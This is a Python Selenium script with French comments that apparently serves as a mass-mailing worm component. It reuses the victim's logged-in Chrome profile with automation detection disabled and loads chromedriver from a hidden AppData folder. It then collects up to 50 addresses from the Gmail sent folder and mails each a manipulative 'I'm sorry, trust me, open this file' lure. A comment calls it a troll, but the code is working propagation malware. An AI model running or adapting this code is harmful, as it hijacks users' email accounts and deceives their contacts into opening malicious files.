import os
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException

#ptit malin pk tu guette le code comme as, c'est un code troll g pas de site pour l'hébergé

EMAIL_SUBJECT = "Important.. je suis désolé..."
EMAIL_BODY = """
désolé mais...
c'est important pour moi que tu sache ça, je..
je veux pas que ça se sache alors tien ce fichier et regarde ce qui as dedans.. fait moi confiance
"""

def is_connected(driver):
    try:
        driver.find_element(By.XPATH, "//a[contains(@title, 'Boîte de réception') or contains(@aria-label, 'Inbox')]")
        return True
    except NoSuchElementException:
        return False

def get_sent_contacts(driver):
    driver.get("https://mail.google.com/mail/u/0/#sent")
    time.sleep(3)
    contacts = set()
    sent_emails = driver.find_elements(By.CSS_SELECTOR, "tr.zA")
    for mail in sent_emails[:50]:
        try:
            title = mail.find_element(By.CSS_SELECTOR, "span.yP").get_attribute("email")
            if title:
                contacts.add(title)
            else:
                name = mail.find_element(By.CSS_SELECTOR, "span.yP").text
                if "@" in name:
                    contacts.add(name)
        except Exception:
            continue
    return list(contacts)

def send_mail(driver, to_addr, subject, body):
    compose_btn = driver.find_element(By.CSS_SELECTOR, "div.T-I.T-I-KE.L3")
    compose_btn.click()
    time.sleep(2)
    to_input = driver.find_element(By.NAME, "to")
    to_input.send_keys(to_addr)
    subj_input = driver.find_element(By.NAME, "subjectbox")
    subj_input.send_keys(subject)
    body_input = driver.find_element(By.CSS_SELECTOR, "div[aria-label='Corps du message' i]")
    body_input.send_keys(body)
    body_input.send_keys(Keys.CONTROL, Keys.ENTER)
    time.sleep(2)

def get_driver(chromedriver_path, chrome_options):
    from selenium import __version__ as selenium_version
    # Pour selenium >= 4.6, il faut utiliser Service
    major, minor, *_ = map(int, selenium_version.split('.'))
    if major > 4 or (major == 4 and minor >= 6):
        from selenium.webdriver.chrome.service import Service
        service = Service(executable_path=chromedriver_path)
        return webdriver.Chrome(service=service, options=chrome_options)
    else:
        # Ancienne syntaxe
        return webdriver.Chrome(executable_path=chromedriver_path, options=chrome_options)

def main():
    chrome_options = Options()
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    user_data_dir = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
    if os.path.exists(user_data_dir):
        chrome_options.add_argument(f'--user-data-dir={user_data_dir}')
        chrome_options.add_argument('--profile-directory=Default')
    hidden_path = os.path.expandvars(r"%APPDATA%\.sys_hidden")
    chromedriver_path = os.path.join(hidden_path, "chromedriver.exe")
    driver = get_driver(chromedriver_path, chrome_options)
    driver.get("https://mail.google.com/mail/u/0/#inbox")
    time.sleep(5)
    if not is_connected(driver):
        driver.quit()
        return
    contacts = get_sent_contacts(driver)
    for email in contacts:
        try:
            send_mail(driver, email, EMAIL_SUBJECT, EMAIL_BODY)
            time.sleep(2)
        except Exception:
            continue
    driver.quit()

if __name__ == "__main__":
    main()
